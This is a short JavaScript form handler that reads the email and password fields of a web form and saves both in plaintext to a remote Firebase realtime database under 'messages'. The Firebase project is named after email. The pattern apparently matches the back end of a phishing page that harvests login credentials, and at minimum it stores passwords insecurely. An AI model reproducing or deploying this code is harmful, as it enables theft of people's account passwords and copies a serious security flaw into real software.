// Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  
  var firebaseConfig = {
    apiKey: "***********",
    authDomain: "email-48310.firebaseapp.com",
    databaseURL: "https://email-48310-default-rtdb.firebaseio.com",
    projectId: "email-48310",
    storageBucket: "email-48310.appspot.com",
    messagingSenderId: "912671691701",
    appId: "1:912671691701:web:8afcacf7d1bc98c588bffc",
    measurementId: "G-RJ1TP7DLZY"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

  var messagesRef = firebase.database().ref('messages');

  document.getElementById('enterinfo').addEventListener('submit', submitForm);

  function submitForm(e){
    e.preventDefault();
  
    // Get values
    var email = getInputVal('email');
    var password = getInputVal('password');
  
    // Save message
    saveMessage(email, password);
  
    // Show alert
    document.querySelector('.alert').style.display = 'block';
  
    // Hide alert after 3 seconds
    setTimeout(function(){
      document.querySelector('.alert').style.display = 'none';
    },3000);
  
    // Clear form
    document.getElementById('enterinfo').reset();
  }
  
  // Function to get get form values
  function getInputVal(id){
    return document.getElementById(id).value;
  }
  
  // Save message to firebase
  function saveMessage(email, password){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
      email: email,
      password: password,
    });
  }